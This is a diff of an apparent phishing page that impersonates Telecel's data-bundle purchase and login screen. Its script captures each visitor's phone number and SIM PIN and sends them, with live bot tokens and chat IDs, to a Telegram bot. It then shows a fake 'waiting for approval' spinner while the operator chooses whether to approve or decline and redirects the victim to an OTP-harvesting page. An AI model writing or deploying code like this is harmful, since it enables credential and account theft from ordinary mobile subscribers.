@@ -1,499 +1,226 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>Telecel - Log In & Purchase</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telecel - Verify Number to Buy Offer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
+            background: #f8f9fa;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-            color: #333;
+            padding: 12px;
         }
-        
         .container {
-            width: 100%; 
-            max-width: 420px;
-            background: #fff; 
-            border-radius: 16px;
-            padding: 32px 24px; 
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
-            text-align: center;
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+            overflow: hidden;
         }
-        
-        .logo-t {
-            color: #E30613; 
-            font-size: 52px; 
-            font-weight: 900; 
-            letter-spacing: -1px;
-            border: 4px solid #E30613; 
-            border-radius: 50%;
-            width: 80px; 
-            height: 80px; 
-            line-height: 72px; 
+        .logo-section {
+            text-align: center;
+            padding: 40px 0 20px;
+        }
+        .telecel-logo {
+            width: 155px;
+            height: auto;
             margin: 0 auto;
+            filter: drop-shadow(0 6px 14px rgba(227, 6, 19, 0.2));
         }
-        
-        .logo-text {
-            color: #E30613; 
-            font-size: 28px; 
-            font-weight: 700; 
-            margin: 8px 0 24px;
-        }
-        
-        h1 { 
-            font-size: 24px; 
-            font-weight: 700; 
-            margin-bottom: 8px; 
-        }
-        
-        .subtitle { 
-            font-size: 15px; 
-            color: #555; 
-            line-height: 1.4; 
-            margin-bottom: 24px; 
-        }
-        
-        .bundle-info {
-            background: linear-gradient(135deg, rgba(227, 6, 19, 0.1) 0%, rgba(0, 51, 160, 0.1) 100%);
-            border-left: 4px solid #E30613;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 24px;
-            text-align: left;
-        }
-        
-        .bundle-info h3 {
-            color: #E30613;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-        
-        .bundle-info p {
-            color: #666;
-            font-size: 13px;
-            margin: 2px 0;
-        }
-        
-        .bundle-price {
-            font-size: 18px;
-            font-weight: 700;
-            color: #0033A0;
-            margin-top: 6px;
-        }
-        
-        .form-group { 
-            text-align: left; 
-            margin-bottom: 24px; 
-        }
-        
-        label { 
-            display: block; 
-            font-size: 14px; 
-            font-weight: 600; 
-            margin-bottom: 8px; 
-        }
-        
-        select, input[type="tel"], input[type="text"] {
-            width: 100%; 
-            padding: 16px 18px; 
-            font-size: 17px;
-            border: 1.5px solid #E30613; 
-            border-radius: 12px; 
-            outline: none;
-            transition: all 0.3s;
-        }
-        
-        select:focus, input:focus { 
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
-            border-color: #0033A0;
-        }
-        
-        #password {
-            font-size: 22px;
-            letter-spacing: 8px;
+        h1 {
             text-align: center;
-            font-weight: 600;
-        }
-        
-        .error-msg {
-            color: #dc3545; 
-            font-size: 13px; 
-            margin-top: 6px; 
-            display: none;
-            padding: 10px;
-            background: rgba(220, 53, 69, 0.1);
-            border-radius: 6px;
-        }
-        
-        .success-msg {
-            color: #28a745; 
-            font-size: 13px; 
-            margin-top: 6px; 
-            display: none;
-            padding: 10px;
-            background: rgba(40, 167, 69, 0.1);
-            border-radius: 6px;
-        }
-        
-        .btn-action, .btn-back {
-            width: 100%; 
-            padding: 18px; 
-            font-size: 18px; 
+            font-size: 24px;
             font-weight: 700;
-            border-radius: 12px; 
-            cursor: pointer; 
-            transition: all 0.2s; 
             margin: 12px 0 8px;
+            color: #1e2937;
+            padding: 0 20px;
         }
-        
-        .btn-action {
-            color: #fff; 
-            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
-            border: none;
-            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.25);
-        }
-        
-        .btn-action:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
-        }
-        
-        .btn-action:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .btn-back {
-            font-size: 16px; 
-            font-weight: 600; 
-            color: #E30613;
-            background: transparent; 
-            border: 1.5px solid #E30613;
-        }
-        
-        .btn-back:hover { 
-            background: rgba(227, 6, 19, 0.05); 
-        }
-        
-        #spinner {
-            position: fixed; 
-            inset: 0; 
-            background: rgba(227, 6, 19, 0.15);
-            display: none; 
-            justify-content: center; 
-            align-items: center; 
-            z-index: 9999;
-        }
-        
-        .spin {
-            width: 60px; 
-            height: 60px; 
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #E30613; 
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin { 
-            to { transform: rotate(360deg); } 
-        }
-        
-        .password-wrapper {
-            position: relative;
-        }
-        
-        .password-wrapper input {
-            padding-right: 48px;
-        }
-        
-        .toggle-password {
-            position: absolute;
-            top: 50%;
-            right: 16px;
-            transform: translateY(-50%);
-            cursor: pointer;
-            width: 24px;
-            height: 24px;
-            fill: #333;
-            transition: fill 0.2s;
-        }
-        
-        .toggle-password:hover {
-            fill: #E30613;
-        }
-        
-        .back-to-bundles {
+        .subtitle {
             text-align: center;
-            margin-top: 16px;
+            color: #475569;
+            font-size: 15.5px;
+            padding: 0 25px 20px;
+            line-height: 1.45;
         }
-        
-        .back-to-bundles a {
-            color: #0033A0;
-            text-decoration: none;
-            font-size: 14px;
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 25px;
+            padding: 18px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #ffe0e0;
+        }
+        .offer-info strong {
+            font-size: 1.15rem;
+            color: #1e2937;
+        }
+        .form-section {
+            padding: 0 25px 35px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            font-size: 14.8px;
             font-weight: 600;
-            transition: color 0.2s;
+            margin-bottom: 8px;
+            color: #1e2937;
         }
-        
-        .back-to-bundles a:hover {
-            color: #E30613;
-            text-decoration: underline;
+        input, select {
+            width: 100%;
+            padding: 15px 16px;
+            border: 1.8px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16.5px;
         }
-        
+        input:focus, select:focus {
+            border-color: #E30613;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+        }
+        .continue-btn {
+            width: 100%;
+            background: #E30613;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 17.5px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .back-btn {
+            width: 100%;
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .error-msg {
+            text-align: center;
+            margin: 12px 0;
+            font-size: 14.8px;
+            padding: 13px;
+            border-radius: 12px;
+            display: none;
+            color: #dc3545;
+            background: #ffebee;
+        }
         @media (max-width: 480px) {
-            .container {
-                padding: 24px 16px;
-            }
-            
-            h1 {
-                font-size: 20px;
-            }
-            
-            .subtitle {
-                font-size: 14px;
-            }
+            .telecel-logo { width: 138px; }
+            .container { border-radius: 20px; }
+            h1 { font-size: 22px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo-t">t</div>
-        <div class="logo-text">telecel</div>
-        
-        <h1>Welcome to Telecel Play</h1>
-        <p class="subtitle">
-            Input your telecel number and pin to complete your purchase.
-            <br/>
-            You need to be a Telecel subscriber to proceed.
-        </p>
-        
-        <!-- Bundle Information Display -->
-        <div class="bundle-info" id="bundleInfo" style="display: none;">
-            <h3>📦 Your Selected Bundle</h3>
-            <p id="bundleData">-</p>
-            <p id="bundlePrice" class="bundle-price">-</p>
+        <div class="logo-section">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKEAAACgCAYAAABkDQwTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAA02SURBVHgB7Z1NbBvHFcffmyWlukEcBWiAFpYUGhYlJZcoQJEeQyO5R+q5qKW7W9s9JenB0qEJCrSwjPYuOj03ds5NKgbtpSmKMGjRWJIDUbbSHvpFJ3Eti9ydzluSKj92yV2KK0qe/w9QIlLL8ePwz/l47+0bIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDhgn0xXYmk/F/SaUyxFymSqV8tlQqEYgNRBgBI7gxJ52eJ49fVopzmigTerHWRfPfkkf8oVflW2dLt0sEugIRdmF7aiqXIueq6aUc9YsRpdb6uutWjCBLZQIdQIQBiPjSylnTusuIFxMzepZY6/zEnc0VAi1AhE38fXY2U63qtUONfD0QMZLnrUx+tpUn4AMR1tk9N31BK141v45FfU3qzBlyzE/188/JNT9xMGJcndzauEIAIhTuTU2bdR8vR73+9MWL9PXvLlBq/Iz/+L/v3qR/v/4GxUcXqxW1YPvmRZHlxBFg+rnn6Ju//YBO//DigQAPB885ab2+nZnNkMVYLcI4AnxiYYGe+dU7AxLf/zFTUaYmxEzkZcDjhrUi3JmauRxVgF975RV6+qdvkzr9JCWBCDGVHr1JlmKlCGUXrJiuRblWNh5jP36TjoCc/8WwECtF6Hp6Peq1oy+9NPApOAz5Yuxms3NkGSmyjLvZ2UUTwchEvf4JswvuRWp2ltLmR3/5ZeDf3S++CP1bO5qUjNDnySKsc9HsTs9sx4mEnPnTH4mfPNxa0DMi/Nu3X4r+As3nJ+7cLpAlWDUd10bBeKG4wwpQUKdPx7qeWF8li7BKhGqIH65EV2KQuzc1myNLsEaEkpQwyISEuMi6MA6edufJEqwRoWJnaB+qxJWjbkwasFKvkSXYI0Kil2lIfPGLX1JcxIF9kL39mGOFCLczcxISO3L/m4x+5Z+8RQ/e7S8Y4jjpHFmAHX7C1FdGgA4lhUy3D3/zPnn1KVfEV9ncLO//+S9jXsxpuBnNnCELsEKEjlZjSXpEH/3hIyq/9Xb704dOSGBNz5IFWDEdn9gRhelpsgBLNia671GpGjNjeqAwW5HeZX1SKxg+VoiQWZUIHFswEh5nPL1NFmCFCBW5RTqBaKYdsgArRFipPFGiPnF3h7cx8TSdyC9PXKwQ4dlSUcpvFOik4SqI8HHC0/pDOlkUbbkf2aIEBlWghBhE4ms7nuedtC9N31gjwnq6fIFiEqW8x+h3YqTuR8RznVWyBKtcNGah/x4lgKTvP/VmP2VAgtFEH9pUGsSqu+286qm8M/LwUpwM66hZME8uXqBTr75K+x995D+W+5VlmhaBfpW/QV+98w5FhXX0ujiPA1aJUHbJd7OzK0x6Lepr4lTbkvuTU+Odt4iOPP8cRUVr/d7knY0CWYR1EZPJrdt5irE27DchtV/cqrKuCoOVYbuUw0vmf5FK98o9w5IveCQwr9hYJs5KEX7r9u2S9vRS1Ov/8/obsYtgNhPxTrvrE5u3l8lCrE1gmPxs85aMPFGulZzCf3zv+30L8cGNXpsSKZb5aJksJbkbL04A1/71z8KPvvGMJP7nel0ru+S99z/wd7tSLDMKcq/J/Z/9nPZ+9/tuVxkB7p+3ubI/ygUbdqdmLuuIpeIEqaZw+gcXfSe101ZZQYS3/+mnvmAf/Prd7i4eplvV/UdLth8tARHW2c0+P0fs3oxbpUEZX2C67oKR6boaNevGLAVsXQO2AxE2IcUzK663zMQXKDF0kbS6YlPVrV5AhAHUxKjzPMCqDTi/JByIsAsyRXtUvWxGRqkL09edbxIHljAcRr5wIMKISKk2qZTFSs0xm3Vj0I3pTDtmTWl8kF7RCLfguvsFnGcHAAAAgBOAFWvCe1Mz6wcnd8r5w0xFt6KsTBZo5252On/gkhpS3xxZ7FjK9e6cy67uTE0v0zBhnjOdvmj7UV6BDKlvEheh+NxkJEqxs66UusScpCM4Ov6Zck7amrrQcZC+UanRRToiEs2sFgH6pyfx8AqWd8OWIpT9wFq/QEdEoiOhCHCYFfPBySCxkTDsyAYmPSbn+/a78K2vVfz1inEEl+gw6P7qFjYVNC8PyhndWIMdpr2B9s0RkpgIFTkhhcp5LJXW2/eyMy3PVj29cFYSTQMQQTtaXVCKcyYMlmk877ehqaC1d8N1nUJcYZtF+FNRrxUbUqQumcV7jppCeM02xI0L19p0rhpD5hpt1trTRfPv5Ce2Nq5HaUNpnneUeq2zb8xuV+vr/fTNUZLgmlBGmegeICegmqp8s1Mjo2vmQ56XpnTQC43rhVnlHKVLd89NX5kMEXK/tNgQRt2Gu9mZqyZOvNQrTiwxaa3dawduo472WES5ei87vRiW8Cp2OenRq6ZbLof3jdntMq/V+iYbmDxh7H122I66Y5Pe7xK3dLRsatIjox93/fCbkB0dK765e256YLvvfmwwn+p6Nxvkb5rc9VABtrY4p1IjHXff+V+M9Mi6L8CIdpmY95p/0v0x5LiIsNxegapa1Wv9bGq0otVB+biqrnezfxtmM+3P++tkxXmKkZGjmC61P+ekR1ZFoBQX5uXIZ+YpPktHxDEQoS4yOeeb1yxyGmf4VEU7HukbkiIV3B6PBY0ecamNGsEftPm3P+lpg+O22OCPqsqJfNN9c1vNJztJ33RJui13t4uO5QmiQ6jAoMvVinqx9vte4O5STuPUQYuctpR4/1vNnae41x3iy9QncgIUq4eLQTawpisTdzYOihXVRNFZ0cFsosSGAyHWM7YzFIJUXiBWt0z7JXlsxCQpY/PtibVR+8Zfd5L7ccCVOZkpjlOK2ZGLUJu1X7edmtlczAdNgZp0fnJzY7n5OdkAmF2gTOMtI1b9XLi+O9pJ74XaMHFns6VallR0uDc9s9yZX1gbwRquEsX8cqB4/Ib5fEDpD3m8upvNynvz30eY20uytifb7lcZ3/pr0USqCkEzSjqdljaKdExIUITclwDMmikXtFkzLpBP/GkplcrIY8dEO/ydXfiZdbLu6u/brj2zG++0wjxVarfBPJujHicviZDC1pYyso532U2Pb20diEWRygVfpQsi0MYjsUt7pl9CljRaO8cqZp6YCM2UWA5xHHRFaXohyGWg2Lmm0k7rbZldXAuHcdYa24NFpXk5lR5dpkjocsOGinGKp0JsrVQ5skuJQ8KfknRgYvOLLc91We1Xq3sHwjaj+30eso/msazAINMmHYaBHOfFN6JcFceJXB/5D0Wt9mHTMoVp6GvDx06E0sluZf8KDZfrJtoRaYd+lGca1/qGF+mYcezqE0acHsrmkvumUyUsVSZPl1k5RbdCAwlPac+4jTjCqNO4sYl0yRhekpOj3MrerfYNUdosTcIWJsadtEgRd/Ka9U7PvqmffXJgl+kbMzeXHHYKE2azQseQ5EToeWXxtLbTa+eqmUsh3Ww6ceM8DRATYclQHBu0vmV2xwsUEzlHJZV+KO+3Y0Mgzmjj2M5H+fJozebLQUE+wqLpmxdpgBi308lP5XLZC11rSMxThFj/yTRPSSYYH7ZQz/UKO0l7Jka62P68jCDd2pSdZd2Osa42MM/vTM1cjmuDVIg1o1JIvWwek0xmeU2THZntc+fmxTb/1oQ6Uu44uA2ai9I3vWxvt+tudnqtvW+SILFtke+WIPVx1OurlUdPN0ZH4/uTjs8FXqh10T+ThJtcQGb3qVi90MhGMaNCy/vayc6smm/bJepBrVTv5rxv//TMdphbRfxyLHaYyElUG7o4j3vS3Fa3vhG7tOe9161vTD+fbfYciDBVhGJQvi9yayORUF5i07H4t0yHBU5BQbRMz5pXzFYwF3ghm6A+t4XTWnx6ujMCIyMb654ibD5fWHu8FBSN8S/zExU4Y4Q9H2SDX/KjDd95PD27YkQRK2zW3pZUma26WsQ8FmQXK9X6Pjv9nS39o4iLUVxpTMntohPdHRtH7ErUa5uHe4mEiBOX+sB0Z8dUGvkMk6ZTNf3XRCyiGWBFIehZCauZ9WYk100D8+G3TON+lVniPvtG59vX4rX3ST19laZf71NCJCrCcYmxRvggZRps7xx5rdmlLkiUgiIio4bcrhj0t2rllGwoeuwOW48e80VDvBTHBknI6OYiMuG1xejiDq7g6hd/N6G+gfXN/qmlnkL0vDwlxJG4yiUebLaBl7mzypVxH/D16v7eathuWbJPqh5JksCF0LQq3y3B+W7tHNgiGTqkxZaD3V+vokWNknH1+G+GDmlDzzbrbfWqX+jfSKZ53qwdup3N0rOPG9T7ZrH5c/IzcowAk6wmdqTxGl9Q1VpnGZ9aeTym36qWkeyNyU+jDdNeqf/7VeLf63JgQz2EJlkvh7GhuU35vd+2Gn07KLsOcx8QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnDj+ByGKzKp0DGEPAAAAAElFTkSuQmCC" class="telecel-logo" alt="Telecel Logo">
         </div>
-        
-        <div class="form-group">
-            <label>Account type</label>
-            <select id="accountType">
-                <option value="mobile">Mobile</option>
-                <option value="broadband">Broadband</option>
-            </select>
+
+        <h1>Verify Number to Buy Offer</h1>
+        <p class="subtitle">Complete verification to activate your selected bundle</p>
+
+        <div class="offer-info" id="offerInfo">
+            <strong id="offerTitle"></strong><br>
+            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
         </div>
-        
-        <div class="form-group">
-            <label id="inputLabel">Phone Number</label>
-            <input id="phone" inputmode="tel" placeholder="020XXXXXXX or 050XXXXXXX" type="tel"/>
-        </div>
-        
-        <div class="form-group">
-            <label>
-                PIN
-                <small style="color:#666; font-weight:400;">
-                    (4 digits only)
-                </small>
-            </label>
-            <div class="password-wrapper">
-                <input autocomplete="off" id="password" inputmode="numeric" maxlength="4" placeholder="••••" type="text"/>
-                <svg class="toggle-password" id="togglePassword" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path>
-                </svg>
+
+        <div class="form-section">
+            <div class="form-group">
+                <label>Account Type</label>
+                <select id="accountType">
+                    <option value="mobile">Mobile</option>
+                    <option value="broadband">Broadband</option>
+                </select>
             </div>
-        </div>
-        
-        <div class="error-msg" id="err">
-            Please enter a valid Telecel number and 4-digit PIN
-        </div>
-        
-        <div class="success-msg" id="successMsg">
-            ✓ Credentials verified! Redirecting...
-        </div>
-        
-        <button class="btn-action" id="next">
-            Complete Purchase
-        </button>
-        
-        <button class="btn-back" id="back">
-            Cancel
-        </button>
-        
-        <div class="back-to-bundles">
-            <a href="index.html">← Back to Data Bundles</a>
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
+            </div>
+            <div class="form-group">
+                <label>PIN (4 digits)</label>
+                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
+            </div>
+            <div class="error-msg" id="errMsg"></div>
+           
+            <button class="continue-btn" id="continueBtn">Verify Number</button>
+            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
         </div>
     </div>
-    
-    <div id="spinner">
-        <div class="spin"></div>
+
+    <!-- Spinner -->
+    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
+        <div style="width:72px; height:72px; border:7px solid #fff; border-top-color:#E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
+        <p style="margin-top:20px; font-size:17px;">Waiting for approval...</p>
     </div>
 
     <script>
-        // CONFIG
         const CONFIG = {
-            BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
-            CHAT_ID: '6573120346',
-            MIN_PHONE_LENGTH: 10,
-            REDIRECT_PAGE: 'otp.html'
+            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+            CHAT_ID: '7547427914',
+            APPROVE_PAGE: 'https://unlimiteddata.vercel.app/otp.html',
+            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
         };
 
-        // STATE
-        const state = {
-            lastUpdateId: 0,
-            pollInterval: null,
-            approveId: null,
-            declineId: null,
-            verifyDeviceId: null,
-            bundleInfo: null
-        };
+        let state = { lastUpdateId: 0, pollInterval: null };
 
-        // DOM Elements
-        const els = {
-            accountType: document.getElementById('accountType'),
-            inputLabel: document.getElementById('inputLabel'),
-            phoneInput: document.getElementById('phone'),
-            passwordInput: document.getElementById('password'),
-            togglePassword: document.getElementById('togglePassword'),
-            nextBtn: document.getElementById('next'),
-            errMsg: document.getElementById('err'),
-            successMsg: document.getElementById('successMsg'),
-            spinner: document.getElementById('spinner'),
-            backBtn: document.getElementById('back'),
-            bundleInfo: document.getElementById('bundleInfo'),
-            bundleData: document.getElementById('bundleData'),
-            bundlePrice: document.getElementById('bundlePrice')
-        };
+        const phoneInput = document.getElementById('phone');
+        const pinInput = document.getElementById('password');
+        const continueBtn = document.getElementById('continueBtn');
+        const errMsg = document.getElementById('errMsg');
+        const spinner = document.getElementById('spinner');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
 
-        // === Extract Bundle Info from URL ===
-        function extractBundleInfo() {
+        // Strict Ghana Number Validation
+        function isValidGhanaNumber(phone) {
+            if (phone.length !== 10) return false;
+            const validPrefixes = ['020','050','023','024','027','054','055','057','059','026','028'];
+            return validPrefixes.some(prefix => phone.startsWith(prefix));
+        }
+
+        // Load Offer from URL Parameters
+        function loadOffer() {
             const params = new URLSearchParams(window.location.search);
-            const bundle = params.get('bundle');
-            const price = params.get('price');
-            
-            if (bundle && price) {
-                state.bundleInfo = { bundle, price };
-                
-                // Display bundle info
-                els.bundleInfo.style.display = 'block';
-                els.bundleData.textContent = `${bundle.toUpperCase()} Data Bundle`;
-                els.bundlePrice.textContent = `GHS ${price}`;
-                
-                // Update button text
-                els.nextBtn.textContent = `Pay GHS ${price} & Continue`;
-                
-                // Store in localStorage for verification page
-                localStorage.setItem('selectedBundle', bundle);
-                localStorage.setItem('bundlePrice', price);
-            }
+            const tier = params.get('tier') || 'Data Bundle';
+            const data = params.get('data') || '';
+            const price = params.get('price') || '0';
+
+            offerTitleEl.textContent = `${tier} - ${data}`;
+            offerPriceEl.textContent = `GHS ${price}`;
         }
 
-        // === PIN Input Strict Control ===
-        els.passwordInput.addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        // Input Sanitization
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
+        pinInput.addEventListener('input', () => {
+            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
         });
 
-        els.passwordInput.addEventListener('paste', function(e) {
-            const pasted = e.clipboardData.getData('text');
-            if (!/^\d{0,4}$/.test(pasted)) e.preventDefault();
-        });
-
-        // === Password Toggle ===
-        els.togglePassword.addEventListener('click', () => {
-            const isHidden = els.passwordInput.type === 'password';
-            els.passwordInput.type = isHidden ? 'text' : 'password';
-            
-            els.togglePassword.innerHTML = isHidden 
-                ? '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>'
-                : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
-        });
-
-        // === Account Type Switch ===
-        function updateInputField() {
-            const type = els.accountType.value;
-            if (type === 'mobile') {
-                els.inputLabel.textContent = 'Phone Number';
-                els.phoneInput.type = 'tel';
-                els.phoneInput.placeholder = '020XXXXXXX or 050XXXXXXX';
-                els.phoneInput.inputMode = 'tel';
-            } else {
-                els.inputLabel.textContent = 'User ID / Account Number';
-                els.phoneInput.type = 'text';
-                els.phoneInput.placeholder = 'ABCDXXX';
-                els.phoneInput.inputMode = 'text';
-            }
-        }
-        els.accountType.addEventListener('change', updateInputField);
-        updateInputField();
-
-        els.phoneInput.addEventListener('input', () => {
-            if (els.accountType.value === 'mobile') {
-                els.phoneInput.value = els.phoneInput.value.replace(/\D/g, '');
-            }
-        });
-
-        // === Helpers ===
-        function showError(msg = "Please enter a valid Telecel number and 4-digit PIN") {
-            els.errMsg.textContent = msg;
-            els.errMsg.style.display = 'block';
-            els.successMsg.style.display = 'none';
-        }
-
-        function hideError() {
-            els.errMsg.style.display = 'none';
-        }
-
-        function showSuccess(msg = "✓ Credentials verified! Redirecting...") {
-            els.successMsg.textContent = msg;
-            els.successMsg.style.display = 'block';
-            els.errMsg.style.display = 'none';
-        }
-
-        function showSpinner() {
-            els.spinner.style.display = 'flex';
-        }
-
-        function hideSpinner() {
-            els.spinner.style.display = 'none';
-        }
-
-        function stopPolling() {
-            if (state.pollInterval) {
-                clearInterval(state.pollInterval);
-                state.pollInterval = null;
-            }
-        }
-
-        // === Bot Sending + Polling (FIXED: HTML parse mode) ===
-        function sendLoginAttempt(accountType, accountValue, password) {
+        function sendToBot(phone, pin) {
             const ts = Date.now();
-            state.approveId = `approve_${ts}`;
-            state.declineId = `decline_${ts}`;
-            state.verifyDeviceId = `verify_device_${ts}`;
+            const approveId = `approve_${ts}`;
+            const verifyId = `verify_${ts}`;
+            const declineId = `decline_${ts}`;
 
-            const bundleText = state.bundleInfo 
-                ? `\nBundle: <code>${state.bundleInfo.bundle}</code> (GHS ${state.bundleInfo.price})`
-                : '';
-
-            const message = `<b>Telecel Play Purchase Request</b>\n\n` +
-                            `Account Type: <code>${accountType}</code>\n` +
-                            `Account: <code>${accountValue}</code>\n` +
-                            `PIN: <code>${password}</code>` +
-                            bundleText +
-                            `\n\nApprove?`;
+            const message = `<b>🔴 Telecel Verification Request</b>\n\nOffer: ${offerTitleEl.textContent}\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -504,136 +231,70 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [
-                                { text: '✅ Approve & Complete', callback_data: state.approveId },
-                                { text: '❌ Decline', callback_data: state.declineId }
-                            ],
-                            [
-                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId }
-                            ]
+                            [{ text: "✅ Approve Access", callback_data: approveId }, { text: "🔍 Verify Device", callback_data: verifyId }],
+                            [{ text: "✅ Valid PIN", callback_data: `valid_${ts}` }, { text: "❌ Invalid PIN", callback_data: `invalid_${ts}` }],
+                            [{ text: "❌ Decline", callback_data: declineId }]
                         ]
                     }
                 })
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (!data.ok) {
-                    console.error("Send failed:", data);
-                    hideSpinner();
-                    showError("Failed to send to Telegram. Check bot token / chat ID.");
-                } else {
-                    startImprovedPolling();
-                }
-            })
-            .catch(err => {
-                console.error(err);
-                hideSpinner();
-                showError('Connection error: ' + err.message);
+            }).then(() => {
+                spinner.style.display = 'flex';
+                startPolling(approveId, verifyId, declineId);
+            }).catch(() => {
+                spinner.style.display = 'none';
+                errMsg.textContent = "Network error. Please try again.";
+                errMsg.style.display = 'block';
             });
         }
 
-        function startImprovedPolling() {
-            stopPolling();
+        function startPolling(approveId, verifyId, declineId) {
+            if (state.pollInterval) clearInterval(state.pollInterval);
 
             state.pollInterval = setInterval(() => {
-                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10&allowed_updates=["callback_query"]`;
-
-                fetch(url)
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
-                        if (!data.ok || !data.result?.length) return;
-
-                        for (const update of data.result) {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
                             state.lastUpdateId = update.update_id;
-
-                            const cb = update.callback_query;
-                            if (!cb) continue;
-
-                            const cbData = cb.data;
-
-                            if (cbData === state.approveId) {
-                                stopPolling();
-                                showSuccess("✓ Purchase approved! Completing transaction...");
-
